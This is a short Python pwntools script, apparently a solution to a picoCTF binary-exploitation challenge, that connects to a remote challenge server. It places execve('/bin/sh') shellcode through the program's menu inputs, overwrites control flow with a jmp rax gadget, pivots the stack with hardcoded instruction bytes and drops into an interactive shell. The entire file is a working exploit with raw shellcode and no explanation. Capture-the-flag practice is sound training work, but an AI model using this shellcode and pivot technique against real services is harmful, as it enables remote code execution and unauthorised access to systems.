from pwn import *

context.arch = 'amd64'

p = remote('shape-facility.picoctf.net', 53774)

jmp_rax = p64(0x000000000040116c)

# x86-64 execve("/bin/sh") shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# pivot: sub rsp, 664 then jmp rsp (hardcoded bytes)
pivot = b"\x90\x90\x48\x81\xec\x98\x02\x00\x00\xff\xe4"
payload = pivot.ljust(20, b"\x90")
payload += jmp_rax

p.sendlineafter(b'3. Exit the app\n', b'1')
p.sendlineafter(b'name: \n', b'A' * 8)

p.sendlineafter(b'3. Exit the app\n', b'1')
p.sendlineafter(b'name: \n', b'A' * 8)

p.sendlineafter(b'3. Exit the app\n', b'2')
p.sendlineafter(b'to?\n', b'1')
p.sendlineafter(b'them?\n', b'\x90' * 16 + shellcode)

p.sendlineafter(b'3. Exit the app\n', b'3')
p.sendlineafter(b'it: \n', payload)

p.interactive()
